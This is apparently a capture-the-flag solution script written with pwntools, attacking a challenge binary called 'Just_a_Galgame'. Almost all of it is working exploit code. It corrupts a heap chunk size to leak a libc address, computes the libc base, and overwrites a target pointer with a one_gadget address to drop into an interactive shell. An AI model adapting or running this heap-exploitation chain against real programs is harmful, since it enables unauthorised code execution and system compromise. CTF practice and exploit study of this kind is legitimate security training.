#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'Just_a_Galgame'
#libFile = '/lib/x86_64-linux-gnu/libc.so.6'
libFile = './libc.so.6'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad_68():
	sla('>>', '1')
def mv(idx, name):
	sla('>>', '2')
	sla('>>', str(idx))
	sa('>>', name)
def ad_1000():	
	sla('>>', '3')

def dp():
	sla('>>', '4')

def q():
	sla('>>', '5')
	sa('QAQ\n', 'No bye!\x00')

#--------------------------Exploit--------------------------
def exploit():

	ad_68()
	mv(0, '\x00' * 8 + p64(0xd41))
	ad_1000()
	ad_68()
	dp()
	libc_base = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - (0x7f70a91f92a0 - 0x7f70a8e0d000)
	li('libc_base: ' + hex(libc_base))

	sla('>>', '5')
	target = libc_base + (0x8880a8 - 0x49d000)
	one_gadget = libc_base + 0x4f3c2
	sa('QAQ\n', p64(target - 0x60))
	db()
	mv(8, p64(one_gadget))
	

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
